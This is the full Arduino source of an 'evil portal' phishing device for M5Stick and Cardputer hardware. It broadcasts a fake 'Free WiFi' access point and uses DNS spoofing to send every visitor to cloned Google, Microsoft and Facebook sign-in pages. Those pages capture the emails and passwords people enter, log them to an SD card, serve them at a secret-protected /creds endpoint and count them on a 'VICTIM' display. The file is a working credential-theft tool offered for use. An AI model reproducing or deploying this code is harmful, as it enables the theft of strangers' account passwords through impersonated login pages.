// Author: Helvio Junior (M4v3r1ck)
//         https://github.com/helviojunior/m5stack-captive-portal
//
// Based on https://github.com/n0xa/M5Stick-Stuph/blob/main/CaptPort/CaptPort.ino
//      and https://github.com/marivaaldo/evil-portal-m5stack
//

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

// Define your hardware
//#define M5STICK_C_PLUS
#define M5STICK_C_PLUS_2
//#define M5CARDPUTER

// Define the language
// #define LANGUAGE_EN_US
#define LANGUAGE_PT_BR

// Standard Wifi Name
// Can be changed at http://127.0.0.1/ssid
#define DEFAULT_AP_SSID_NAME "Free WiFi"

// Secret to get the creds
#define SECRET "P@ssw0rd!"

#if defined(M5STICK_C_PLUS) && defined(M5STICK_C_PLUS_2) && defined(M5CARDPUTER)
#error "Please define only one platform: M5STICK_C_PLUS, M5STICK_C_PLUS_2 or M5CARDPUTER"
#endif

#if defined(M5STICK_C_PLUS)
#include <M5StickCPlus.h>
#elif defined(M5STICK_C_PLUS_2)
#include <M5StickCPlus2.h>
#elif defined(M5CARDPUTER)
#include <M5Cardputer.h>
#endif

#include "fonts.h"
#include "logo.h"
#include "logos2.h"

#if defined(M5STICK_C_PLUS)
#define DISPLAY M5.Lcd
#define SPEAKER M5.Beep
#define HAS_LED 10  // Number is equivalent to GPIO
#define GPIO_LED 10
// #define HAS_SDCARD
#define SD_CLK_PIN 0
#define SD_MISO_PIN 36  //25
#define SD_MOSI_PIN 26
// #define SD_CS_PIN
#define M5_BUTTON_HOME 37
#define AXP
TFT_eSprite spr = TFT_eSprite(&M5.Lcd);
#endif

#if defined(M5STICK_C_PLUS_2)
#define DISPLAY M5.Lcd
#define SPEAKER M5.Speaker
#define HAS_LED 19  // Number is equivalent to GPIO
#define GPIO_LED 19
// #define HAS_SDCARD
#define SD_CLK_PIN 0
#define SD_MISO_PIN 36  //25
#define SD_MOSI_PIN 26
// #define SD_CS_PIN
#define M5_BUTTON_HOME 37
#define PWRMGMT
#define BACKLIGHT 27
#define MINBRIGHT 120
LGFX_Sprite spr = LGFX_Sprite(&M5.Lcd);
#endif

#if defined(M5CARDPUTER)
#define DISPLAY M5Cardputer.Display
#define SPEAKER M5Cardputer.Speaker
#define KB M5Cardputer.Keyboard
#define HAS_SDCARD
#define SD_CLK_PIN 40
#define SD_MISO_PIN 39
#define SD_MOSI_PIN 14
#define SD_CS_PIN 12
#define PWRMGMT
#define BACKLIGHT 38
#define MINBRIGHT 165
LGFX_Sprite spr = LGFX_Sprite(&M5.Lcd);
#endif

#if defined(HAS_SDCARD)
#include <FS.h>
#include <SD.h>
#include <SPI.h>
#endif


#define SD_CREDS_PATH "/creds.txt"

#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR)
#error "Please define only one language: LANGUAGE_EN_US or LANGUAGE_PT_BR"
#endif

#if defined(LANGUAGE_EN_US)
#define LOGIN_TITLE "Sign in"
#define SELECT_MESSAGE "Select your Account Provider"
#define LOGIN_SUBTITLE "Use your {provider} Account"
#define LOGIN_EMAIL_PLACEHOLDER "Email"
#define LOGIN_PASSWORD_PLACEHOLDER "Password"
#define LOGIN_MESSAGE "Please log in to browse securely."
#define LOGIN_BUTTON "Next"
#define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
#elif defined(LANGUAGE_PT_BR)
#define LOGIN_TITLE "Fazer login"
#define SELECT_MESSAGE "Selecione a plataforma desejada"
#define LOGIN_SUBTITLE "Use sua Conta {provider}"
#define LOGIN_EMAIL_PLACEHOLDER "E-mail"
#define LOGIN_PASSWORD_PLACEHOLDER "Senha"
#define LOGIN_MESSAGE "Por favor, faça login para navegar de forma segura."
#define LOGIN_BUTTON "Avançar"
#define LOGIN_AFTER_MESSAGE "Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet."
#endif


// -=-=-=-=-=- LIST OF CURRENTLY DEFINED FEATURES -=-=-=-=-=-
// AXP        - AXP192 Power Management exposed as M5.Axp
// PWRMGMT    - StickC+2 Power Management exposed as M5.Power
// KB         - Keyboard exposed as M5Cardputer.Keyboard
// BACKLIGHT  - Alias to the pin used for the backlight on some models
// MINBRIGHT  - The lowest number (0-255) for the backlight to show through

int totalCapturedCredentials = 0;
int previousTotalCapturedCredentials = -1;  // stupid hack but wtfe
String capturedCredentialsJson = "";
bool sdcardMounted = false;
String hr,mi,se;

byte use_google = 1;
byte use_microsoft = 1;
byte use_facebook = 1;

int cp1,cp2,cp3;
String last_auth_prov[4]={"", "", "", ""};
int last_auth_idx[4]={0, 0, 0, 0};
String last_auth_username[4]={"", "", "", ""};
String last_auth_pass[4]={"", "", "", ""};

#define color 0x01EA
#define color2 ORANGE

String apSsidName = String(DEFAULT_AP_SSID_NAME);

#if defined(HAS_SDCARD)
SPIClass* sdcardSPI = NULL;
SemaphoreHandle_t sdcardSemaphore;
#endif

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const int TICK_TIMER = 500;
const int SCREEN_TIMER = 180 * 1000;
const int DIM_TIMER = 20 * 1000;
IPAddress AP_GATEWAY(172, 0, 0, 1);  // Gateway
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
int screen_dim_current = 0;
byte led_status = HIGH;

DNSServer dnsServer;
WebServer webServer(80);

int ConvertRGB( byte R, byte G, byte B)
{
  return ( ((R & 0xF8) << 8) | ((G & 0xFC) << 3) | (B >> 3) );
}

void setup() {
  setupDeviceSettings();
  setupWiFi();
  setupWebServer();
  setupSdCard();

  #if defined(M5STICK_C_PLUS_2)
       StickCP2.Rtc.setDateTime( { { 1970, 1, 1 }, { 0, 0, 0 } } );
  #else
    RTC_TimeTypeDef TimeStruct;
    TimeStruct.Hours   = 0;
    TimeStruct.Minutes = 0;
    TimeStruct.Seconds = 0;
    M5.Rtc.SetTime(&TimeStruct);
  #endif

  bootTime = lastActivity = millis();
}

void setupDeviceSettings() {
  Serial.begin(115200);
  while (!Serial && millis() < 1000)
    ;

#if defined(M5STICK_C_PLUS) || defined(M5STICK_C_PLUS_2)
  M5.begin();
  DISPLAY.setRotation(0);
#elif defined(M5CARDPUTER)
  M5Cardputer.begin();
  DISPLAY.setRotation(1);
#endif

#if defined(HAS_LED)
  pinMode(GPIO_LED, OUTPUT);
  digitalWrite(GPIO_LED, HIGH);
#endif

  DISPLAY.fillScreen(BLACK);
  DISPLAY.setSwapBytes(true);
  DISPLAY.setTextSize(2);
  spr.createSprite(135,240);
}


bool setupSdCard() {
#if defined(HAS_SDCARD)
  sdcardSemaphore = xSemaphoreCreateMutex();
  sdcardSPI = new SPIClass(FSPI);
  sdcardSPI->begin(SD_CLK_PIN, SD_MISO_PIN, SD_MOSI_PIN, SD_CS_PIN);

  delay(10);

  if (!SD.begin(SD_CS_PIN, *sdcardSPI)) {
    Serial.println("Failed to mount SDCARD");
    return false;
  } else {
    Serial.println("SDCARD mounted successfully");
    sdcardMounted = true;
    return true;
  }
#else
  return true;
#endif
}

void setupWiFi() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apSsidName);
}

void setupWebServer() {
  dnsServer.start(DNS_PORT, "*", AP_GATEWAY);  // DNS spoofing (Only HTTP)

  webServer.on("/post", []() {

    webServer.send(HTTP_CODE, "text/html", index_POST());

#if defined(M5STICK_C_PLUS)
    SPEAKER.tone(4000);
#elif defined(M5CARDPUTER) || defined(M5STICK_C_PLUS_2)
      SPEAKER.tone(4000, 50);
#endif

    printScreen();

    delay(50);

#if defined(M5STICK_C_PLUS)
    SPEAKER.mute();
#endif

#if defined(HAS_LED)
    blinkLed();
#endif
  });

  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "application/json", creds_GET());
  });

  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear_GET());
  });

  webServer.on("/google", []() {
    webServer.send(HTTP_CODE, "text/html", provider_GET("google"));
  });

  webServer.on("/microsoft", []() {
    webServer.send(HTTP_CODE, "text/html", provider_GET("msft"));
  });

  webServer.on("/facebook", []() {
    webServer.send(HTTP_CODE, "text/html", provider_GET("facebook"));
  });

  webServer.on("/config", []() {
    webServer.send(HTTP_CODE, "text/html", config_GET());
  });

  webServer.on("/post_config", []() {
    webServer.send(HTTP_CODE, "text/html", config_POST());
  });

  webServer.onNotFound([]() {
    lastActivity = millis();
    int pc = 0;
    if (use_google == 1) pc = pc + 1;
    if (use_microsoft == 1) pc = pc + 1;
    if (use_facebook == 1) pc = pc + 1;

    if (pc >= 2){
      webServer.send(HTTP_CODE, "text/html", index_GET());
    }else if (use_facebook == 1){
      webServer.send(HTTP_CODE, "text/html", provider_GET("facebook"));
    }else if (use_microsoft == 1){
      webServer.send(HTTP_CODE, "text/html", provider_GET("msft"));
    }else{
      webServer.send(HTTP_CODE, "text/html", provider_GET("google"));
    }
  });

  webServer.begin();
}

void loop() {
  bool show_display = 1;
  int diff = (millis() - lastTick);
  bool pressed = check_select_press();
  if (pressed) lastActivity = millis();
  if ((diff > TICK_TIMER) || pressed) {
    if (((millis() - lastActivity) > SCREEN_TIMER) and (!pressed)) show_display = 0;

    lastTick = millis();
    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
      previousTotalCapturedCredentials = totalCapturedCredentials;
      show_display = 1;
    }

    if (led_status == HIGH) {
      led_status = LOW;
    }else{
      led_status = HIGH;
    }
    digitalWrite(GPIO_LED, led_status);

  }

  if (show_display == 1){
    printScreen();
  }else{
    spr.fillSprite(TFT_BLACK);
  }

  dnsServer.processNextRequest();
  webServer.handleClient();
}

bool check_select_press(){
#if defined(KB)
  M5Cardputer.update();
  if (KB.isKeyPressed(KEY_ENTER) || KB.isKeyPressed('/')){
    dimtimer();
    return true;
  }
#else
  if (digitalRead(M5_BUTTON_HOME) == LOW){
    return true;
  }
#endif
  return false;
}

void printScreen() {

  int h, m, s;
  #if defined(M5STICK_C_PLUS_2)
      auto dt = StickCP2.Rtc.getDateTime();
      h = dt.time.hours;
      m = dt.time.minutes;
      s = dt.time.seconds;
    #else
      M5.Rtc.GetBm8563Time();
      h = M5.Rtc.Hour;
      m = M5.Rtc.Minute;
      s = M5.Rtc.Second;
    #endif
 
  if(h<10) hr="0"+String(h); else hr=String(h);
  if(m<10) mi="0"+String(m); else mi=String(m);
  if(s<10) se="0"+String(s); else se=String(s);

  spr.fillSprite(TFT_BLACK);
 
  drawBatteryBar();

  // Draw graphics first
  spr.drawFastHLine(10, 144, 35, color2);
  spr.drawFastVLine(45, 144, 64, color2);
  spr.drawFastVLine(46, 144, 64, color2);
  spr.drawFastHLine(45, 208, 79, color2);

  spr.pushImage(10,148,30,39,logo);

  spr.setTextFont(0);
  spr.setTextColor(ConvertRGB(75,143,190),BLACK);
  spr.drawString("TIME:",12,200);
  
  //spr.drawString("TEMP:",12,150);
  //spr.drawString(String(temp),12,160);
  
  spr.setTextDatum(4);
  spr.fillRoundRect(10, 72, 55,46,4,color);
  spr.fillRoundRect(70, 72, 55,46,4,color);
  spr.fillRoundRect(10, 122, 115, 17, 0, 0x0083);
  
  // Draw texts

  spr.setTextDatum(0);
  spr.setTextColor(WHITE,BLACK);
  spr.drawString("VICTIM",10,8,2);
  spr.setFreeFont(&DSEG7_Classic_Bold_32);
  spr.drawString(String(cp1 + cp2 + cp3),10,30);

  spr.setTextColor(WHITE,0x0083);
  spr.drawString("LAST AUTH",13,122,2);

  spr.setTextColor(WHITE,BLACK);
  spr.setFreeFont(&DSEG7_Classic_Bold_17);
  spr.drawString(hr+":"+mi,10,216);
  spr.setFreeFont(&DSEG7_Classic_Bold_12);
  spr.drawString(se,76,216);
  
  byte auth_empty = 1;
  for(int i=0;i<4;i++){

    if (last_auth_idx[i] > 0){
      auth_empty = 0;
      spr.setTextColor(0x7765,BLACK);
      String idx = "";
      
      int c = last_auth_idx[i];
      if (c >= 100) idx = String(c) + ":";
      else if (c >= 10) idx = " "+ String(c) + ":";
      else idx = "  " + String(c) + ":";
      spr.drawString(idx,53,142+(i*15),2);

      spr.setTextColor(WHITE,BLACK);
      spr.drawString(last_auth_prov[i],83,142+(i*15),2);
    }

  }

  if (auth_empty == 1){
    spr.setTextColor(ConvertRGB(170,0,0),BLACK);
    spr.drawString("EMPTY",70,167,2);
  }
  
  //spr.fillCircle(62,150+(chosen*15),4,TFT_RED);
  
  spr.setTextDatum(4);
  spr.setTextColor(WHITE,color);
  spr.drawString("MSFT",14,82,2);
  if (use_google && use_facebook) {
    spr.drawString("OTHER",74,82,2);
  }else if (use_facebook) {
    spr.drawString("FACE",74,82,2);
  }else{
    spr.drawString("GOOGLE",74,82,2);
  }
  spr.setFreeFont(&DSEG7_Classic_Bold_17);
  if (use_microsoft) {
    spr.drawString(String(cp1),17,102);
  }else{
    spr.drawString("na",17,102);
  }
  if (use_google || use_facebook) {
    spr.drawString(String(cp2 + cp3),77,102);
  }else{
    spr.drawString("na",77,102);
  }

  spr.setTextDatum(0);
  spr.pushSprite(0,0); 

  int diff = (millis() - lastActivity);
  if (diff > DIM_TIMER) {
    if (screen_dim_current > 0){
      if (diff > DIM_TIMER * 6) {
        screenBrightness(0);
      }else if (diff > DIM_TIMER * 2) {
        screenBrightness(30);
      }else{
        screenBrightness(60);
      }
    }
  }else{
    screenBrightness(100);
  }

}

void screenBrightness(int bright){
  if (bright < 0) bright = 0;
  if (bright > 100) bright = 100;
  if (bright == screen_dim_current) return;
  //Serial.printf("Brightness: %d\n", bright);
  #if defined(AXP)
    M5.Axp.ScreenBreath(bright);
  #endif
  #if defined(BACKLIGHT)
    int bl = MINBRIGHT + round(((255 - MINBRIGHT) * bright / 100)); 
    analogWrite(BACKLIGHT, bl);
  #endif
  screen_dim_current = bright;
}

void drawBatteryBar(){

  // Batery Level
  for(int i=0;i<5;i++)
  spr.fillRect(100+(i*6),10,4,12,color);

  int battery = 0;
  #if defined(PWRMGMT)
    battery = round(M5.Power.getBatteryLevel());
  #endif

  #ifdef defined(AXP)
    float b = M5.Axp.GetVbatData() * 1.1 / 1000;
    battery = round(((b - 3.0) / 1.2) * 100);
  #endif

  uint16_t batteryBarColor = BLUE;
  if(battery <= 40) {
    batteryBarColor = ConvertRGB(170,0,0);
  } else if(battery <= 60) {
    batteryBarColor = ConvertRGB(238,138,17);
  } else {
    batteryBarColor = ConvertRGB(0,135,67);
  }
  int batG = (battery / 20);
  for(int i=0;i<batG;i++)
  spr.fillRect(100+(i*6),10,4,12,batteryBarColor);

  //spr.setTextDatum(0);
  //spr.setTextColor(WHITE,0x0083);
  //spr.setFreeFont(&DSEG7_Classic_Bold_32);
  //spr.drawString(String(battery) + "%",100,30, 2);

}

String getInputValue(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}


String index_GET() {

  String loginTitle = String(LOGIN_TITLE);
  String loginSubTitle = String(SELECT_MESSAGE);

  String btn = "";

  if (use_microsoft == 1){
    btn = btn + "<button type='button' style='background: transparent' class='containerlogo' onclick='javascript:location.href=\"/microsoft\"'>" + String(LOGO_MSFT) + "</button>";
  }

  if (use_google == 1){
    btn = btn + "<button type='button' style='background: transparent' class='containerlogo' onclick='javascript:location.href=\"/google\"'>" + String(LOGO_GOOGLE) + "</button>";
  }

  if (use_facebook == 1){
    btn = btn + "<button type='button' style='background: transparent' class='containerlogo' onclick='javascript:location.href=\"/facebook\"'>" + String(LOGO_FACEBOOK) + "</button>";
  }

  String html =
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "  <title>"
    + apSsidName + "</title>"
                   "  <meta charset='UTF-8'>"
                   "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                   "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} .container{ margin: auto; padding: 20px;} .logo-container{  margin-bottom: 30px; display: flex; text-align: center; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo:first-child { margin-right: 20px; } .containerlogo{ padding: 10px; width: 45%; min-height: 110; float: left; display: flex; text-align: center; justify-content: center; align-items: center; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
                   "</head>"
                   "<body>"
                   "  <div class='container'>"
                   "    <div class='logo-container'>"
                   "      <?xml version='1.0' standalone='no'?>"
                   "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
                   "    </div>"
                   "    <div class=form-container>"
                   "      <div style='min-height: 100px'>"
                   "       <center><div class='containertitle'>" + loginTitle + "</div><div class='containersubtitle'>" + loginSubTitle +  "</div></center>"
                   "     </div>"
                   "     <div style='min-height: 150px;'>" + btn + "</div>"
                   "   </div>"
             "  </div>"
             "</body>"
             "</html>";
  return html;
}


String provider_GET(String provider) {
  
  provider.toLowerCase();
  if ((provider == "microsoft") || (provider == "msft")){
    provider = "Microsoft";
  }else if (provider == "facebook"){
    provider = "Facebook";
  }else{
    provider = "Google";
  }

  String loginTitle = String(LOGIN_TITLE);
  String loginSubTitle = String(LOGIN_SUBTITLE);
  String loginEmailPlaceholder = String(LOGIN_EMAIL_PLACEHOLDER);
  String loginPasswordPlaceholder = String(LOGIN_PASSWORD_PLACEHOLDER);
  String loginMessage = String(LOGIN_MESSAGE);
  String loginButton = String(LOGIN_BUTTON);

  loginTitle.replace(String("{provider}"), provider);
  loginSubTitle.replace(String("{provider}"), provider);
  loginEmailPlaceholder.replace(String("{provider}"), provider);
  loginPasswordPlaceholder.replace(String("{provider}"), provider);
  loginMessage.replace(String("{provider}"), provider);
  loginButton.replace(String("{provider}"), provider);

  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input type='hidden' name='provider' value='" + provider + "' /><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>", provider);
}

String index_POST() {
  String email = getInputValue("email");
  String password = getInputValue("password");
  String provider = getInputValue("provider");
  provider.toLowerCase();

  String ts = String(round(millis() / 1000));
  String cred = "{\"timestamp\": "+ ts + ", \"provider\": \""+ provider +"\", \"username\": \""+ email +"\", \"password\": \""+ password +"\"}";
  if (capturedCredentialsJson != "") capturedCredentialsJson = capturedCredentialsJson + ",";
  capturedCredentialsJson = capturedCredentialsJson + cred;

  Serial.printf("%s\n", cred.c_str());

  if ((provider == "microsoft") || (provider == "msft")){
    provider = "msft";
    cp1 = cp1 + 1;
  }else if (provider == "facebook"){
    provider = "face";
    cp3 = cp3 + 1;
  }else{
    cp2 = cp2 + 1;
  }
  totalCapturedCredentials = cp1 + cp2 + cp3;

  for(int i=3;i>=1;i--){
    if (last_auth_idx[i-1] > 0){
      last_auth_prov[i] = last_auth_prov[i-1];
      last_auth_idx[i] = last_auth_idx[i-1];
      last_auth_username[i] = last_auth_username[i-1];
      last_auth_pass[i] = last_auth_pass[i-1];
    }
  }

  last_auth_prov[0] = provider;
  last_auth_idx[0] = totalCapturedCredentials;
  last_auth_username[0] = email;
  last_auth_pass[0] = password;

#if defined(HAS_SDCARD)
  appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
#endif

  if ((provider == "microsoft") || (provider == "msft")){
    provider = "Microsoft";
  }else if ((provider == "facebook") || (provider == "face")){
    provider = "Facebook";
  }else{
    provider = "Google";
  }

  lastActivity = millis() + 1000;
  String msg = String(LOGIN_AFTER_MESSAGE);
  msg.replace("{provider}", provider);
  return getHtmlContents("<center><div class='containermsg'>" + msg + "</div></center>", provider);
}

#if defined(HAS_LED)

void blinkLed() {
  int count = 0;

  while (count < 5) {
    digitalWrite(GPIO_LED, LOW);
    delay(500);
    digitalWrite(GPIO_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}

#endif

#if defined(HAS_SDCARD)

void appendToFile(fs::FS& fs, const char* path, const char* text) {
  if (xSemaphoreTake(sdcardSemaphore, portMAX_DELAY) == pdTRUE) {
    File file = fs.open(path, FILE_APPEND);

    if (!file) {
      Serial.println("Failed to open file for appending");
      xSemaphoreGive(sdcardSemaphore);
      return;
    }

    Serial.printf("Appending text '%s' to file: %s\n", text, path);

    if (file.println(text)) {
      Serial.println("Text appended");
    } else {
      Serial.println("Append failed");
    }

    file.close();

    xSemaphoreGive(sdcardSemaphore);
  }
}

#endif



String getHtmlContents(String body, String provider) {

  if (provider.isEmpty()) provider = "Google";

  provider.toLowerCase();
  String logo = "";
  if ((provider == "microsoft") || (provider == "msft")){
    provider = "msft";
    logo = String(LOGO_MSFT);
  }else if (provider == "facebook"){
    logo = String(LOGO_FACEBOOK);
  }else{
    logo = String(LOGO_GOOGLE);
  }

  String html =
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "  <title>"
    + apSsidName + "</title>"
                   "  <meta charset='UTF-8'>"
                   "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                   "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
                   "</head>"
                   "<body>"
                   "  <div class='container'>"
                   "    <div class='logo-container'>"
                   "      <?xml version='1.0' standalone='no'?>"
                   "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
                   "    </div>"
                   "    <div class=form-container>"
                   "      <center>"
                   "        <div class='containerlogo'>"+ logo + "</div>"
                   "      </center>"
                   "      <div style='min-height: 150px'>"
    + body + "      </div>"
             "    </div>"
             "  </div>"
             "</body>"
             "</html>";
  return html;
}


String clear_GET() {
  capturedCredentialsJson = "";
  totalCapturedCredentials = cp1 = cp2 = cp3 = 0;

  for(int i=0;i<4;i++){
    last_auth_prov[i] = "";
    last_auth_idx[i] = 0;
    last_auth_pass[i] = "";
    last_auth_pass[i] = "";
  }

  return getAdminHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
}

String creds_GET() {
  String secret = getInputValue("secret");
  if (secret.isEmpty() || secret != SECRET)
    return "{\"message\": \"access denied\"}";
  
  return "{\"creds\": ["+ capturedCredentialsJson +"]}";
}


String config_GET() {
  
  return getAdminHtmlContents("<center><div class='containertitle'>Config</div><div class='containersubtitle'>Adjust your configuration</div></center><form action='/post_config' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='Wifi SSID' value='"+ apSsidName +"' required><div class='containermsg'>Selected enabled providers</div><input name='msft' class='input-field' type='checkbox' value='on' checked />Micosoft<br /><input name='google' class='input-field' type='checkbox' value='on' checked />Google<br /><input name='facebook' class='input-field' type='checkbox' value='on' checked />Facebook<div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>Save</button></div></form>");
}

String config_POST() {
  String ssid = getInputValue("ssid");
  String msft = getInputValue("msft");
  String google = getInputValue("google");
  String facebook = getInputValue("facebook");

  String oldSSid = apSsidName;
  if (!ssid.isEmpty()) apSsidName = ssid;
  
  use_microsoft = 0;
  use_google = 0;
  use_facebook = 0;
  if (!msft.isEmpty() && msft == "on") use_microsoft = 1;
  if (!google.isEmpty() && google == "on") use_google = 1;
  if (!facebook.isEmpty() && facebook == "on") use_facebook = 1;

  if ((use_microsoft == 0) && (use_google == 0) && (use_facebook == 0)) use_google = 1;

  if (oldSSid != apSsidName) setupWiFi();

  lastActivity = millis() + 1000;
  return getAdminHtmlContents("<center><div class='containermsg'>Config OK</div></center>");
}

String getAdminHtmlContents(String body) {

  String html =
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "  <title>"
    + apSsidName + "</title>"
                   "  <meta charset='UTF-8'>"
                   "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                   "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} input[type='checkbox']{ width: 20px; margin-left: 10px; } .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
                   "</head>"
                   "<body>"
                   "  <div class='container'>"
                   "    <div class='logo-container'>"
                   "      <?xml version='1.0' standalone='no'?>"
                   "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
                   "    </div>"
                   "    <div class=form-container>"
                   "      <div style='min-height: 150px'>"
    + body + "      </div>"
             "    </div>"
             "  </div>"
             "</body>"
             "</html>";
  return html;
}